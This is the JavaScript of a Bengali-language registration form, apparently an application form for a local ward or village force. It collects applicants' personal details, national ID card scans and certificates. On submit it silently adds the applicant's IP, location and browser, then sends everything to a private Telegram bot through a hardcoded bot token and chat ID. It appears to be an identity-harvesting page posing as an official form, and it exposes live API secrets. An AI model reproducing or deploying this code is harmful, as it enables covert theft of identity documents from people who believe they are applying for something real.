// জন্ম তারিখ থেকে বয়স গণনা
const dobField = document.getElementById('dob');
const ageField = document.getElementById('age');
dobField.addEventListener('change', () => {
  const dob = new Date(dobField.value);
  const diff = Date.now() - dob.getTime();
  const age = Math.floor(diff / (1000 * 60 * 60 * 24 * 365.25));
  ageField.value = age;
});

// ওয়ার্ড → গ্রাম ম্যাপিং
const wardVillageMap = {
  '1': ['ডুমনী', 'ফাউগান'],
  '2': ['প্রহলাদপুর'],
  '3': ['আটিপাড়া', 'নানাইয়া', 'নানাইয়ারচর', 'বাঘমারা', 'মার্তারচর'],
  '4': ['আতলড়া', 'বনখড়িয়া'],
  '5': ['উজলিয়া', 'করলামাধবপুর', 'বাশকোপা', 'সেরালিয়াবাড়ী'],
  '6': ['আশুলীয়াপাড়া', 'পোতাবাড়ী', 'ভিটিপাড়া', 'মরিচারচালা'],
  '7': ['কদমা', 'প্রতাবপুর', 'রাখালিয়া', 'লোহাগাছিয়া'],
  '8': ['চরদমদমা', 'দমদমা'],
  '9': ['নিমুরিয়া', 'মেন্দিপুর', 'মারতা']
};

const wardField = document.getElementById('ward');
const villageField = document.getElementById('village');
wardField.addEventListener('change', () => {
  const villages = wardVillageMap[wardField.value] || [];
  villageField.innerHTML = '<option value="">-- গ্রাম নির্বাচন করুন --</option>';
  villages.forEach(v => {
    const opt = document.createElement('option');
    opt.value = v;
    opt.text = v;
    villageField.appendChild(opt);
  });
});

// NID অপশন লজিক
const nidOption = document.getElementById('nidOption');
const nidSeparate = document.getElementById('nidSeparate');
const nidCombinedDiv = document.getElementById('nidCombinedDiv');
nidOption.addEventListener('change', () => {
  if (nidOption.value === 'separate') {
    nidSeparate.style.display = 'block';
    nidCombinedDiv.style.display = 'none';
    document.getElementById('nidFront').required = true;
    document.getElementById('nidBack').required = true;
    document.getElementById('nidCombined').required = false;
  } else if (nidOption.value === 'combined') {
    nidSeparate.style.display = 'none';
    nidCombinedDiv.style.display = 'block';
    document.getElementById('nidFront').required = false;
    document.getElementById('nidBack').required = false;
    document.getElementById('nidCombined').required = true;
  } else {
    nidSeparate.style.display = 'none';
    nidCombinedDiv.style.display = 'none';
    document.getElementById('nidFront').required = false;
    document.getElementById('nidBack').required = false;
    document.getElementById('nidCombined').required = false;
  }
});

// Form submit + Telegram
const form = document.getElementById('vdpForm');
const loadingDiv = document.getElementById('loading');

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  // Show loading
  loadingDiv.style.display = 'flex';

  const token = "7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
  const chatId = "7079142411";

  const name = document.getElementById('name').value;
  const phone = document.getElementById('phone').value;
  const dob = document.getElementById('dob').value;
  const age = document.getElementById('age').value;
  const heightFeet = document.getElementById('heightFeet').value;
  const heightInch = document.getElementById('heightInch').value;
  const gender = document.getElementById('gender').value;
  const ward = document.getElementById('ward').value;
  const village = document.getElementById('village').value;

  const certificateFile = document.getElementById('certificate').files[0];
  const extraFiles = [
    document.getElementById('extra1').files[0],
    document.getElementById('extra2').files[0],
    document.getElementById('extra3').files[0],
    document.getElementById('extra4').files[0]
  ].filter(Boolean);

  const nidFront = document.getElementById('nidFront')?.files[0];
  const nidBack = document.getElementById('nidBack')?.files[0];
  const nidCombined = document.getElementById('nidCombined')?.files[0];

  // IP + Location
  let ip = 'Unknown', country = 'Unknown', city = 'Unknown';
  try {
    const res = await fetch('https://ipinfo.io/json?token=24260cb6dd365a');
    const data = await res.json();
    ip = data.ip;
    country = data.country;
    city = data.city;
  } catch (err) { console.log('IP Error', err); }

  const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
  const browser = navigator.userAgent;

  let message = `নিবন্ধন তথ্য:\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\n\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });

  async function sendFile(file) {
    if (file) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('document', file);
      await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
        method: 'POST', body: formData
      });
    }
  }

  if (nidOption.value === 'separate') {
    await sendFile(nidFront);
    await sendFile(nidBack);
  } else if (nidOption.value === 'combined') {
    await sendFile(nidCombined);
  }

  await sendFile(certificateFile);
  for (const f of extraFiles) await sendFile(f);

  // Hide loading + show success
  loadingDiv.style.display = 'none';
  alert("✅ ডেটা সফলভাবে সাবমিট হয়েছে। ধন্যবাদ!");
  form.reset();
});
